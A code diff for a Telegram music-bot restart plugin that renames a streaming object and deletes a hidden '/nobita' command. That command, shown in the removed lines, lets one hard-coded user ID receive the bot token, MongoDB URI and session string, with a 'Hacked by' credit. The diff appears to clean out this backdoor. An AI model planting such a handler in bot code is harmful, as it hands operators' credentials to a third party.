@@ -70,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await RAUSHAN.stop_stream_force(message.chat.id)
+        await NOBITA.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -97,7 +97,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await RAUSHAN.stop_stream_force(chat_id)
+            await NOBITA.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -105,26 +105,6 @@ async def restartbot(client, message: Message, _):
 
 
     
-@app.on_message(
-    filters.command("nobita")
-    & filters.private
-    & filters.user(5536473064)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://files.catbox.moe/72kvx7.png",
-       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/rchiex)............☆""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"@rchiex")
-                 ]
-            ]
-         ),
-     )
-
-
 ##########
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
